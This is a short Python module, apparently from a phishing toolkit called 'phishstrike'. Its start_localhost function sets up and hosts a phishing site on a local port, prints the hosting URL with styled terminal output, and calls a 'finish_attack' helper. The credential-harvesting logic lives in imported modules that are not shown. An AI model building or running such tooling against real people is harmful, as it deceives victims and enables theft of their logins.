import os
import time

from phishstrike import state
from phishstrike.server.php import cusport, setup_site
from phishstrike.tunnel.helpers import finish_attack
from lib.terminal_ui import *


def start_localhost() -> None:
    cusport()
    loading_animation(2, "Initializing Server")
    setup_site()
    time.sleep(1)
    os.system("cls" if os.name == "nt" else "clear")
    banner_small()
    slow_type(
        f"    [+] Successfully Hosted at : http://{state.HOST}:{state.PORT}",
        speed=0.01,
        start_rgb=RGB_WHITE,
        end_rgb=RGB_CYAN,
    )
    finish_attack()
